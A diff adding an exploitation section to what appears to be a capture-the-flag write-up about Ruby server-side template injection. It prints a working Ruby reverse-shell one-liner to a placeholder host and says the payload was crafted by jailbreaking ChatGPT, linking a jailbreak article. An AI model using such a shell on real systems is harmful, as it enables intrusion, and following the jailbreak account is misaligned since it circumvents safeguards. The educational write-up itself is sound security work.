@@ -168,9 +168,19 @@ Upon starting a python web server and attempting to fetch myself, I noticed a % 
 
 ## Exploitation
 
-### Name of the technique
+### Ruby-based Server Side Template Injection (SSTI)
 
-This is the exploit
+I was able to test and locate this vulnerability using simple arithmetic logic directly into the user input field on the web app.&#x20;
+
+After I was able to confirm code execution was taking place, the next logical step is to replace the benign payload with a more malicious one and attempt to execute a reverse shell.
+
+Using a Jailbreak on ChatGPT, I was also able to craft a payload:
+
+{% embed url="https://www.digitaltrends.com/computing/how-to-jailbreak-chatgpt/" %}
+
+```
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("YOUR_IP_ADDRESS","YOUR_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
 
 ## Privilege Escalation
 
